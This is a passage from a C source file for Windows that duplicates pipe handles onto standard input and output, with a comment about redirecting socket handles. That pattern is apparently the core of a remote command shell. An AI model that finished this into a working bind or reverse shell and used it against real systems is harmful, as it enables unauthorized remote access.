    // Duplicate the socket handles to stdin, stdout, and stderr
    if (!DuplicateHandle(GetCurrentProcess(), hReadPipe, GetCurrentProcess(), (HANDLE*)&_stdin, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
        closesocket(sock);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        printf("Failed to duplicate stdin handle: %d\n", GetLastError());
        return;
    }

    if (!DuplicateHandle(GetCurrentProcess(), hWritePipe, GetCurrentProcess(), (HANDLE*)&_stdout, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
